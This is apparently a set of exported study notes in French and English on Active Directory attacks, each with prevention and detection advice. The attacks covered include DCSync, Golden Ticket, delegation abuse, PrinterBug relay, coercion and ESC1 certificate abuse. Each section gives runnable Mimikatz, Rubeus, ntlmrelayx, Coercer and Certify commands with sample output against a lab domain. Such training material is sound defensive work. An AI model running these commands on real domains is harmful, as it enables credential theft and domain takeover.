Une stratégie efficace pour détecter l’exploitation des identifiants sur les partages consiste à créer un compte honeypot dans Active Directory.

Configuration idéale pour un compte honeypot :
Un compte de service créé il y a plus de 2 ans, avec un mot de passe non modifié depuis au moins un an.
Ce compte doit être encore actif dans l'environnement, mais la mauvaise configuration de son mot de passe entraînera principalement des tentatives de connexion échouées.

Événements associés à un compte honeypot :
4625 : Tentative de connexion échouée.
4771 : Échec de l'authentification Kerberos.
4776 : Échec de l'authentification NTLM.

Le suivi de ces tentatives peut alerter les administrateurs en cas de compromission des identifiants.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Credentials in Object Properties</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-80f5-819e-d135208eaf15"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Exposition des Identifiants dans les Propriétés des Objets Active Directory – Description, Attaque, Prévention et Détection
Contexte : Storing Credentials in Object Properties in Active Directory

Dans Active Directory, chaque objet possède de nombreuses propriétés, telles que :
L’état du compte (actif/inactif),
La date d’expiration du compte,
La date de la dernière modification du mot de passe,
Le nom du compte,
La localisation de l’employé, son numéro de téléphone, etc.

Les administrateurs remplissent ces propriétés lors de la création des comptes. Toutefois, une mauvaise pratique courante dans le passé était d’ajouter les mots de passe (ou d’autres informations sensibles) dans les propriétés Description ou Info des objets. Cette approche était souvent motivée par la croyance erronée que ces propriétés étaient sécurisées et réservées à une consultation uniquement par les administrateurs. Or, il est important de savoir que tous les utilisateurs du domaine peuvent lire la majorité des propriétés des objets, y compris Description et Info.
Attaque

Un attaquant peut facilement récupérer des mots de passe stockés dans ces propriétés en utilisant un script PowerShell simple qui interroge le domaine pour rechercher des termes spécifiques dans les propriétés Description ou Info des utilisateurs.

Exemple de script PowerShell :

Function SearchUserClearTextInformation {
    Param (
        [Parameter(Mandatory=$true)]
        [Array] $Terms,

        [Parameter(Mandatory=$false)]
        [String] $Domain
    )

    if ([string]::IsNullOrEmpty($Domain)) {
        $dc = (Get-ADDomain).RIDMaster
    } else {
        $dc = (Get-ADDomain $Domain).RIDMaster
    }

    $list = @()

    foreach ($t in $Terms) {
        $list += "($.Description -like "$t")"
        $list += "($.Info -like "$t")"
    }

    Get-ADUser -Filter * -Server $dc -Properties Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet |
        Where { Invoke-Expression ($list -join ' -OR ') } | 
        Select SamAccountName,Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet | 
        fl
}
Dans cet exemple, le script recherche le mot clé "pass" dans les propriétés Description et Info pour trouver les mots de passe en clair. Si un mot de passe est trouvé dans un champ, le script retourne les informations de l’utilisateur.

Exemple d'exécution du script :

PS C:\Users\bob\Downloads&gt; SearchUserClearTextInformation -Terms "pass"
SamAccountName       : bonni
Enabled              : True
Description          : pass: Slavi123
Info                 : 
PasswordNeverExpires : True
PasswordLastSet      : 05/12/2022 15.18.05
Ici, le mot de passe Slavi123 est trouvé dans le champ Description de l'utilisateur bonni.
Prévention

Pour prévenir ce type de mauvaise configuration, voici quelques bonnes pratiques :
Évaluations continues : Effectuer des évaluations continues pour détecter l’éventuelle présence de mots de passe dans les propriétés des objets d’Active Directory.
Formation des employés avec privilèges élevés : Former les administrateurs et les utilisateurs privilégiés pour éviter de stocker des identifiants dans ces propriétés.
Automatisation de la création des comptes utilisateurs : Automatiser autant que possible la création des comptes utilisateurs pour éviter que les administrateurs saisissent manuellement des informations sensibles, comme des mots de passe, dans les propriétés des objets.
Détection

La détection de l'exploitation des informations sensibles dans les propriétés des objets peut être réalisée via l’analyse des comportements des utilisateurs. Cette méthode de détection est plus efficace pour les comptes administratifs ou comptes de service, dont le comportement peut être compris et surveillé.

Les événements à surveiller incluent :
Event ID 4624 : Connexion réussie, ce qui peut indiquer que les identifiants trouvés dans les propriétés des objets ont été utilisés.
Event ID 4625 : Tentative de connexion échouée, si l’attaquant tente d’utiliser les identifiants stockés en clair mais échoue.
Event ID 4768 : Requête Kerberos TGT, liée à l’utilisation des identifiants dans l’environnement Kerberos.

Limite de la détection : L’événement Event ID 4738 (modification d’un objet utilisateur) ne permet pas d’identifier directement quelles propriétés ont été modifiées ou les nouvelles valeurs des propriétés. Cela rend difficile la détection d’ajouts de mots de passe dans ces champs par les administrateurs.
Honeypot

Stocker des mots de passe dans les propriétés des objets peut être une technique intéressante pour créer un honeypot dans un environnement Active Directory qui n’a pas encore atteint un niveau de maturité en termes de gestion des identifiants.

Configuration du compte honeypot :
Le mot de passe est stocké dans le champ Description, ce qui facilite sa découverte par un attaquant.
Le mot de passe fourni est incorrect (cela permet de détecter des tentatives de connexion échouées).
Le compte est activé et possède des tentatives de connexion récentes.
Idéalement, utilisez un compte de service, car les administrateurs ont tendance à les créer manuellement, contrairement aux comptes d’utilisateurs créés par des systèmes automatisés (comme le système RH).
Le mot de passe de ce compte a été défini il y a plus de 2 ans, ce qui le rend crédible aux yeux d'un attaquant.

En raison du mot de passe incorrect, vous pouvez vous attendre à voir des tentatives de connexion échouées, telles que :
Event ID 4625 : Échec de connexion.
Event ID 4771 : Échec de l’authentification Kerberos.
Event ID 4776 : Échec de la validation des identifiants NTLM.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">DCSync</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8025-9c0a-e642173cdba1"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">DCSync Attack in Active Directory
Description

The DCSync attack allows attackers to impersonate a Domain Controller (DC) and perform replication with a targeted Domain Controller to extract password hashes from Active Directory (AD). This attack requires specific permissions, which are:
Replicating Directory Changes
Replicating Directory Changes All

These permissions enable the attacker to request password data from the AD environment, mimicking the behavior of a Domain Controller during replication.

The attack can be initiated by either a user or a computer, as long as the attacker has the necessary replication permissions assigned. This makes it a potent attack method for obtaining credential hashes from the AD environment, even without direct access to the domain controller itself.
Attack Process

Here is an example of how the DCSync attack works using Mimikatz, a popular tool for Windows post-exploitation:
Step 1: Set Up the Attacker User Account

First, the attacker needs to impersonate a user that has the Replicating Directory Changes and Replicating Directory Changes All permissions.
In this example, the user Rocky has the required permissions.
Rocky’s password is Slavi123.
Step 2: Start a Command Shell as the Attacker User

The attacker uses the runas command to launch a command shell as the user Rocky:

C:\Users\bob\Downloads&gt; runas /user:eagle\rocky cmd.exe
Enter the password for eagle\rocky:
Attempting to start cmd.exe as user "eagle\rocky"
Step 3: Use Mimikatz to Perform DCSync

Once in the command shell, the attacker uses Mimikatz to dump password hashes. The attacker targets the Administrator account in this case:

C:\Mimikatz&gt; mimikatz.exe

mimikatz # lsadump::dcsync /domain:eagle.local /user:Administrator
This command initiates the DCSync attack against the Administrator user in the eagle.local domain.

Mimikatz Output Example:

[DC] 'eagle.local' will be the domain
[DC] 'DC2.eagle.local' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSSNEGOTIATE (9)

Object RDN           : Administrator

 SAM ACCOUNT 

SAM Username         : Administrator
Account Type         : 30000000 ( USEROBJECT )
User Account Control : 00010200 ( NORMALACCOUNT DONTEXPIRE_PASSWD )
Account expiration   :
Password last change : 07/08/2022 11.24.13
Object Security ID   : S-1-5-21-1518138621-4282902758-752445584-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: fcdc65703dd2b0bd789977f1f3eeaecf
In this example, the NTLM hash for the Administrator account is extracted. The hash is then used for potential further attacks, like pass-the-hash.
Optional: Dump All Hashes in AD

Alternatively, the attacker can use the /all parameter to dump the hashes of all user accounts in the Active Directory environment:

mimikatz # lsadump::dcsync /domain:eagle.local /all
This command would dump the NTLM hashes of every user in the domain, providing a broader attack surface for the attacker.
Prevention

Complete prevention of DCSync is challenging because the attack mimics standard replication operations within Active Directory. However, several mitigation measures can reduce the risk:
Limit Replication Permissions:
Restrict Replicating Directory Changes and Replicating Directory Changes All permissions to only trusted and necessary Domain Controllers.
Remove unnecessary accounts from these permissions, especially non-administrative or low-privileged accounts.
Use a RPC Firewall:
Implement a RPC Firewall to restrict replication requests to only trusted Domain Controllers. This can help block unauthorized replication attempts from non-DC systems.
Use Managed Service Accounts (MSAs):
Use Managed Service Accounts (MSAs) instead of regular service accounts. MSAs reduce the need for manually managing credentials, which lowers the likelihood of exposing replication permissions to non-DC systems.
Use Strong Authentication:
Implement strong authentication mechanisms such as multi-factor authentication (MFA) for accounts that have replication privileges.
Detection

Detecting DCSync is possible by monitoring for specific events that are generated during the replication process. The following are important steps for detection:
Monitor Event ID 4662:
This event is generated whenever a replication attempt is made on a Domain Controller.
The event logs will contain information about the account initiating the replication and the object being replicated.
Look for Replication Attempts:
When an attacker uses DCSync, Event ID 4662 will log details of the replication attempt.
Be on the lookout for unexpected replication requests from non-DC systems.
Whitelist Trusted Systems:
To reduce false positives, configure event monitoring systems to whitelist systems that legitimately need replication, such as Azure AD Connect or trusted Domain Controllers.

Example of Event ID 4662 (Unauthorized DCSync Attempt):

Event ID: 4662
Account Name: rocky
Object Name: DC2.eagle.local
Object Type: user
Access Mask: Replicate Directory Changes All
This event may indicate a DCSync attempt, particularly if the account initiating the replication is not authorized to perform this action.
Conclusion

The DCSync attack is a highly effective method for attackers to extract password hashes from Active Directory by impersonating a Domain Controller and performing replication. The attack relies on having the necessary replication permissions assigned to the attacker’s account, which may be inadvertently granted due to misconfigurations.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Golden Ticket</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-80af-b186-d52dfc7c6d26"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Kerberos Golden Ticket Attack
Description

The Kerberos Golden Ticket is a highly impactful attack that allows attackers to create or forge valid Kerberos tickets (TGTs) for any user in the domain. By exploiting the krbtgt account (which is responsible for signing all Kerberos tickets in Active Directory), attackers can forge these tickets and impersonate any user, including privileged accounts like Domain Admins.

In a Kerberos authentication setup, the krbtgt account is critical because its password hash is used by the Key Distribution Center (KDC) to sign all Kerberos tickets. An attacker with access to the hash of this password can create valid Kerberos TGTs, enabling the attacker to authenticate as any user in the domain, including those with domain-wide privileges.

The Golden Ticket attack is typically performed after the attacker has gained Domain Admin or equivalent privileges, allowing them to generate a persistent, high-level foothold in the domain.
Attack Overview
Targeting the krbtgt Account:
The krbtgt account is automatically created when a domain is set up. Its password is used by the KDC to sign Kerberos tickets.
This account is disabled by default, but it cannot be deleted, renamed, or enabled.
Possession of the krbtgt password hash enables an attacker to generate legitimate Kerberos TGTs.
Escalating Privileges:
With the Golden Ticket, an attacker can impersonate any user in the domain, including users from other domains in the forest.
The attacker can escalate privileges from a child domain to a parent domain, giving them access to the entire forest.
Persistent Access:
The Golden Ticket provides long-term persistence in the domain, allowing the attacker to maintain access even after their original compromise is detected and remediated.
Steps to Perform the Golden Ticket Attack

Step 1: Obtain the krbtgt Hash and SID

The first step is to obtain the krbtgt password hash and the domain SID. This can be achieved using tools like Mimikatz and DCSync.
Use DCSync to dump the krbtgt hash and domain SID:

mimikatz # lsadump::dcsync /domain:eagle.local /user:krbtgt
Mimikatz Output Example:

SAM Username: krbtgt
Hash NTLM: db0d0630064747072a7da3f7c3b4069e
SID: S-1-5-21-1518138621-4282902758-752445584
The krbtgt hash (in this example: db0d0630064747072a7da3f7c3b4069e) is required for the Golden Ticket, as is the domain SID (S-1-5-21-1518138621-4282902758-752445584).

Step 2: Generate the Golden Ticket

Once the krbtgt hash and domain SID are obtained, the attacker can use Mimikatz to create a forged Kerberos Ticket Granting Ticket (TGT). The kerberos::golden command is used to generate the ticket.

Example command:

mimikatz # kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
Where:
/domain: Specifies the domain name (e.g., eagle.local).
/sid: Specifies the domain SID obtained from the previous step.
/rc4: The NTLM hash of the krbtgt account.
/user: The username for which the Golden Ticket is being created (e.g., Administrator).
/id: The Relative ID (RID) of the user (e.g., 500 for Administrator).
/renewmax: The maximum number of days the ticket can be renewed (e.g., 7).
/endin: The expiration date/time for the ticket (e.g., 8 for 8 days).
/ptt: Places the forged ticket into the current ticket cache (useful for immediate use).

Step 3: Verify the Golden Ticket

Once the ticket is created, it can be verified using the klist command to see if the Golden Ticket has been properly added to the Kerberos ticket cache:

C:\Mimikatz&gt; klist
If the Golden Ticket was successfully created, you should see the forged TGT listed in the output.
Prevention

Preventing the Golden Ticket attack is difficult because it leverages the inherent trust in Kerberos tickets. However, the following steps can mitigate the attack:
Block Privileged Users from Authenticating to Non-Essential Devices:
Restrict privileged users from authenticating to any device that does not require their credentials, reducing the chances of their credentials being used for Golden Ticket generation.
Periodically Reset the krbtgt Password:
Regularly changing the krbtgt account password can limit the window of opportunity for attackers to exploit a compromised hash.
It is recommended to reset the krbtgt password twice, with at least 10 hours between resets, to clear any old hashes.
Enforce SIDHistory Filtering:
Enabling SIDHistory filtering can prevent attackers from using SIDHistory attributes for cross-domain escalation (i.e., moving from a child domain to a parent domain).
Implement Monitoring and Alerting for Unusual Authentication Activity:
Monitor for suspicious Kerberos activity such as multiple requests for TGTs without prior TGS (Ticket Granting Service) requests, which may indicate a Golden Ticket.
Detection
Monitor Event ID 4624 and 4625 for Suspicious Logons:
These event IDs capture both successful and failed logon attempts. Monitor for logons from unusual or unexpected accounts, especially Administrator and other high-privileged accounts.
Look for TGS Requests Without a Prior TGT:
TGS requests that occur without a valid TGT may indicate the presence of a Golden Ticket.
Monitor for Event ID 4675 if SIDHistory Filtering is Enabled:
This event indicates cross-domain escalation, which can be caused by a Golden Ticket being used to impersonate an account from another domain.
Check for Golden Ticket Usage:
Look for evidence of forged TGTs in the Kerberos ticket cache using tools like klist.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Kerberos Constrained Delegation</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-80c2-92d0-fc4b0b69a612"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Description

Kerberos Delegation permet à une application d'accéder à des ressources sur un autre serveur au nom d'un utilisateur, sans que cet utilisateur n'ait un accès direct. Par exemple, un compte de service pour un serveur web peut être délégué pour accéder à une base SQL, ce qui permet aux utilisateurs d'interagir avec les données sans avoir de droits directs sur la base.
Types de délégation Kerberos dans Active Directory :
Unconstrained Delegation (non restreinte)
La plus permissive. Permet au compte délégué d'accéder à n’importe quel service.
Constrained Delegation (restreinte)
Limite les services auxquels le compte peut se déléguer, défini dans les attributs de l’utilisateur.
Resource-Based Constrained Delegation
Moins utilisée, elle est configurée au niveau de l’objet machine cible.
Toutes les formes de délégation représentent un risque potentiel de sécurité. Elles doivent être évitées sauf nécessité absolue.

Attaque : Abus de la Délégation Restreinte (Constrained Delegation)

Quand un compte est configuré pour une délégation restreinte, il peut demander des tickets Kerberos pour d’autres comptes afin d'accéder à des services spécifiques.
Étapes de l’attaque :
Identifier les comptes configurés pour la délégation :

Get-NetUser -TrustedToAuth
Exemple de résultat :

distinguishedname       : CN=web service,CN=Users,DC=eagle,DC=local
msds-allowedtodelegateto: {http/DC1.eagle.local/eagle.local, http/DC1.eagle.local}
useraccountcontrol      : TRUSTEDTOAUTHFORDELEGATION
Récupérer le hash NTLM du mot de passe compromis (ex: Slavi123) :

.\Rubeus.exe hash /password:Slavi123
Sortie :

rc4_hmac : FCDC65703DD2B0BD789977F1F3EEAECF
Impersonner l’utilisateur ‘Administrator’ et injecter le ticket Kerberos :

.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt
Vérifier l’injection du ticket avec klist :

klist
Ouvrir une session distante sur le DC avec les droits de l’Administrator :

Enter-PSSession dc1
Prévention
Activer l’option "Account is sensitive and cannot be delegated" pour les comptes à privilèges.
Ajouter les comptes critiques au groupe "Protected Users", qui empêche toute forme de délégation.
Mettre en place une politique de mot de passe robuste pour éviter les attaques de type Kerberoasting.

Détection
Surveiller les connexions suspectes à l’aide de l’Event ID 4624 (logon réussi).
Inspecter le champ Transited Services dans les journaux pour identifier les processus de logon de type S4U (Service for User).</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Print Spooler &amp; NTLM Relaying</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-80dd-a212-dcbf39da7d97"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Print Spooler Exploitation (PrinterBug)
Description

The Print Spooler service, enabled by default even in modern Windows systems, became a critical attack vector after the discovery of "PrinterBug" by Lee Christensen in 2018.

This bug leverages the functions RpcRemoteFindFirstPrinterChangeNotification and RpcRemoteFindFirstPrinterChangeNotificationEx to force a remote machine to authenticate to an attacker-controlled system, sending Kerberos TGTs that can be relayed or harvested.
Microsoft classified this issue as “by-design” and did not release a patch.

Impact

If a Domain Controller (DC) runs the Print Spooler service, an attacker can:
Relay the DC’s connection to another DC to perform DCSync, assuming SMB signing is disabled.
Force the DC to connect to a server with Unconstrained Delegation, allowing TGTs to be cached and extracted with tools like Mimikatz or Rubeus.
Relay authentication to Active Directory Certificate Services (AD CS) to obtain a valid certificate impersonating the DC.
Abuse the connection to configure Resource-Based Delegation, enabling further privilege escalation.

Attack Methodology

This example demonstrates NTLM relay to perform DCSync by redirecting the DC’s Print Spooler request to another DC.
Step-by-Step:
Start NTLMRelayx, targeting the second DC (DC2):

impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support
Sample Output:

[] Servers started, waiting for connections
Trigger the PrinterBug using Dementor to make the first DC (DC1) authenticate to us:

python3 dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123
Expected Output (even with RPC errors, the relay may succeed):

[] bound to spoolss
[*] getting context handle...
[-] exception RPRN SessionError: code: 0x6ab - RPCSINVALIDNETADDR
Check NTLMRelayx output – if successful, DCSync will return NTLM hashes of domain users, including privileged accounts.

Prevention
Disable Print Spooler on all critical servers (especially DCs):
Use Group Policy or PowerShell:

     Stop-Service spooler
     Set-Service spooler -StartupType Disabled
     Registry Hardening – prevent remote RPC endpoint use:
Key: HKLM\System\CurrentControlSet\Control\Print
Value: RegisterSpoolerRemoteRpcEndPoint
1: Enabled
2: Remote access disabled
Enforce SMB Signing on DCs to prevent NTLM relays.

Detection
While PrinterBug attacks don't generate event ID 4662 (typically used for DCSync detection), they may still be spotted by:
Event ID 4624 – look for suspicious successful logons on DCs from unusual IPs.
Network connection logs – monitor outbound connections from DCs on ports 445 and 139.

Honeypot Strategy

You can deploy PrinterBug as a honeypot to detect lateral movement or exploitation attempts:
Block outbound SMB traffic from servers (139/445) and alert on attempts.
Set traps using decoy servers with Print Spooler enabled and monitor connections.
Use honeypots only if your blue team can respond quickly—they work best in mature security environments.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Coercing Attacks &amp; Unconstrained Delegation</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-803e-b35a-dd1a444b3769"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Coercing Attacks in Active Directory
Description

Coercion attacks are a class of privilege escalation techniques in Active Directory where an attacker forces one system (usually a privileged one like a Domain Controller) to authenticate to an attacker-controlled machine. This allows credential theft or ticket manipulation.

Although PrinterBug is the most well-known example, tools like Coercer now support a wide range of vulnerable RPC functions for this purpose, significantly broadening the attack surface.
Most AD environments are vulnerable by default unless hardened specifically.

Impact

Once a coercion path is successful, the attacker can pivot to various post-exploitation techniques:
Relay to another DC and perform DCSync, if SMB signing is disabled.
Coerce a DC to connect to a server with Unconstrained Delegation (UD) and capture Kerberos TGTs.
Relay to AD Certificate Services to obtain a forged certificate (usable for DCSync or lateral movement).
Abuse Resource-Based Delegation (RBCD) to impersonate users on target systems.

Attack Walkthrough: Capturing a TGT via Coercer
Identify Unconstrained Delegation Hosts

Use PowerView to list machines with Unconstrained Delegation enabled:

Get-NetComputer -Unconstrained | Select samaccountname
Example Output:

samaccountname

DC1$
SERVER01$
WS001$
DC2$
Monitor for TGTs on a Compromised UD Machine

On WS001, run Rubeus to monitor incoming tickets:

.\Rubeus.exe monitor /interval:1
Sample Output:

[] 18/12/2022 22.37.09 UTC - Found new TGT:
User         : bob@EAGLE.LOCAL
StartTime    : 18/12/2022 23.30.09
Trigger Coercion with Coercer

On the attacker machine (e.g., Kali), use Coercer:

Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
Expected Output:

[&gt;] Pipe '\PIPE\lsarpc' is accessible!
[&gt;] Pipe '\PIPE\spoolss' is accessible!
[+] All done!
Capture the Domain Controller's TGT

Rubeus on WS001 will now detect the DC’s TGT:

[] 18/12/2022 22.55.52 UTC - Found new TGT:
User         : DC1$@EAGLE.LOCAL
StartTime    : 18/12/2022 23.30.21
Use the TGT for Authentication

Inject the ticket with Rubeus:

.\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...
Then, dump credentials using Mimikatz:

.\mimikatz.exe "lsadump::dcsync /domain:eagle.local /user:Administrator"
Prevention

Because Windows doesn’t natively restrict coercion vectors, prevention requires proactive controls:
Deploy a Third-Party RPC Firewall
   Example: [Zero Networks RPC Firewall](https://github.com/zeronetworks/rpcfirewall)
Audit or block dangerous RPC functions
Custom blocklists for OPNUMs
Block Outbound Ports 139 and 445
Especially from Domain Controllers and sensitive servers
Prevents coercion responses from reaching attackers

Detection

Detection is challenging, but possible through network and firewall monitoring:
Firewall Log Analysis
Watch for outbound SMB connections (139/445) from core servers
Especially unexpected traffic to non-trusted machines
Dropped Traffic as an Alert Signal
If port blocking is in place, dropped connections can indicate attack attempts
Third-Party Monitoring Tools
The RPC Firewall mentioned above provides robust detection features for these attack vectors.

Final Notes
Coercion is not a vulnerability, but a design issue—and highly effective.
Combining RPC firewalling with network egress restrictions significantly improves defenses.
Regularly audit delegation settings and RPC exposure in your environment.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Object ACLs</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-80b8-a496-d83a9d76b10a"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Attaques par Coercition dans Active Directory
Description

Les attaques par coercition sont devenues une méthode fiable pour élever les privilèges d’un utilisateur standard jusqu’aux privilèges d’administrateur de domaine. Dans un environnement Active Directory (AD) classique, la majorité des configurations sont vulnérables à ce type d’attaque.

L’exploit PrinterBug est l’un des premiers exemples connus de coercition. Depuis, d’autres fonctions RPC vulnérables ont été identifiées. Elles permettent à un utilisateur du domaine de forcer un serveur distant (RemoteServer\$) à s’authentifier auprès d’un autre hôte contrôlé par l’attaquant. L’outil Coercer a été conçu pour exploiter plusieurs de ces fonctions RPC.

Impact

Une fois la coercition établie, l’attaquant peut effectuer différents types d’attaques en chaîne :
Relai vers un autre contrôleur de domaine (DC) pour exécuter une attaque DCSync (si la signature SMB est désactivée).
Forcer un DC à se connecter à un serveur en Délégation Non Restreinte, capturant ainsi un TGT dans la mémoire du serveur (outils : Rubeus, Mimikatz).
Relai vers les services de certificats Active Directory (ADCS) pour générer un certificat s’identifiant comme un DC.
Configurer une délégation Kerberos basée sur les ressources afin de s’authentifier comme n’importe quel administrateur sur la machine ciblée.

Méthodologie de l’attaque

Dans cet exemple, l’objectif est de capturer un TGT sur un serveur compromis configuré avec la délégation non restreinte, à l’aide de l’outil Coercer.
Étapes :
Identifier les serveurs avec Délégation Non Restreinte (via PowerView) :

   Get-NetComputer -Unconstrained | select samaccountname
   Exemple de sortie :

   samaccountname

   DC1$
   SERVER01$
   WS001$
   DC2$
   Surveiller les tickets Kerberos avec Rubeus sur le serveur compromis (ex: WS001) :

   .\Rubeus.exe monitor /interval:1
   Lancer Coercer depuis une machine Kali pour forcer l’authentification du DC vers WS001 :

   Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
   Exemple de sortie :

   [&gt;] Pipe '\PIPE\lsarpc' is accessible!
   ...
   [&gt;] Pipe '\PIPE\spoolss' is accessible!
   ...
   [+] All done!
   Capturer le TGT du DC sur WS001 avec Rubeus :

   [] Found new TGT:
     User : DC1$@EAGLE.LOCAL
   Injecter le ticket capturé pour s’authentifier dans le domaine :

   .\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...
   Lancer une attaque DCSync avec Mimikatz :

   .\mimikatz.exe "lsadump::dcsync /domain:eagle.local /user:Administrator"
   Prévention

Windows ne permet pas nativement de surveiller ou bloquer les appels RPC sensibles. Deux approches de prévention :
Pare-feu RPC tiers : des outils comme le RPC Firewall* de Zero Networks permettent d’auditer et de bloquer des fonctions RPC spécifiques.
Restriction des ports sortants 139 et 445 : bloquer ces ports sur les DC et serveurs critiques empêche le relai d’authentification vers les attaquants.

Détection

Détecter l’abus de coercition via RPC reste complexe sans solutions tierces :
Analyse des journaux de pare-feu : les attaques réussies génèrent du trafic sortant inhabituel, souvent sur le port 445.
Détection des connexions bloquées : bloquer les ports mentionnés empêche la réception de TGT et toute tentative génère une alerte utile.

Conclusion

En combinant filtrage RPC et blocage des ports réseau stratégiques, les organisations renforcent significativement leur sécurité face aux attaques par coercition.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">PKI - ESC1</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8032-887b-c90238b5e678"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Attaque ESC1 – Abus des Active Directory Certificate Services (AD CS)
Description

La recherche Certified Pre-Owned par SpecterOps a mis en lumière les Active Directory Certificate Services (AD CS) comme vecteur d’attaque privilégié en raison de nombreuses mauvaises configurations fréquentes. Les certificats offrent un fort avantage aux attaquants :
Validité longue durée (souvent un an ou plus).
Les réinitialisations de mots de passe n’invalident pas les certificats déjà émis.
Des modèles mal configurés permettent à des attaquants d’obtenir des certificats pour le compte d'autres utilisateurs.
Le compromis de la clé privée d’une autorité de certification permet de forger des "certificats dorés" (Golden Certificates).

L’une des méthodes les plus notoires d’élévation de privilège est ESC1, qui repose sur les caractéristiques suivantes :
Pas d’approbation ou de validation manuelle requise.
Le modèle permet l’authentification client (Client Authentication) ou la connexion par carte à puce.
Le drapeau CTFLAGENROLLEESUPPLIESSUBJECT est activé, permettant à l’utilisateur de fournir lui-même le nom du sujet (SAN).

Exécution de l’attaque ESC1
Rechercher les modèles vulnérables avec Certify :

.\Certify.exe find /vulnerable
Exemple de résultat :
Le modèle UserCert est vulnérable car :
Accessible à tous les utilisateurs du domaine.
Permet la définition du Subject Alternative Name (SAN) (donc l'usurpation d'autres identités).
Ne nécessite pas d’approbation d’un responsable.
Permet l’authentification client (logon).
Demander un certificat en usurpant l’identité de Administrator :

.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator
Cela génère un certificat au format PEM.
Convertir le certificat en format PFX (compatible avec Rubeus) :

sed -i 's/\s\s\+/\n/g' cert.pem
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Utiliser Rubeus pour obtenir un TGT en tant qu’Administrator :

.\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt
Une fois le TGT chargé, vous pouvez par exemple accéder à \\dc1\c$ en tant qu’Administrateur.

Prévention

Pour se prémunir contre l’exploitation du modèle ESC1 :
Désactiver le flag CTFLAGENROLLEESUPPLIESSUBJECT sur les modèles de certificat.
Activer l’approbation manuelle (par un Certificate Manager) pour toute demande de certificat.

Il est recommandé de scanner régulièrement l’environnement PKI avec Certify ou un outil similaire afin de repérer les mauvaises configurations.

Détection
Événements Windows :
ID 4886 : Demande de certificat enregistrée.
ID 4887 : Certificat émis.
ID 4768 : TGT émis suite à l’authentification avec un certificat.
Limitation : Les journaux ne montrent pas directement la valeur du SAN, ce qui peut limiter l’analyse automatique.
Utilisation de certutil pour consulter les certificats émis :

certutil -view
Exemple de récupération de journaux par script :

$events = Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}
$events[0] | Format-List -Property *
Surveillance à distance :

Si l’accès GUI au serveur PKI est indisponible, utilisez une session PowerShell distante :

New-PSSession -ComputerName PKI
Enter-PSSession -ComputerName PKI
Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}
Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4887'}
Remarques
Surveiller étroitement les activités PKI est essentiel pour sécuriser l’Active Directory.
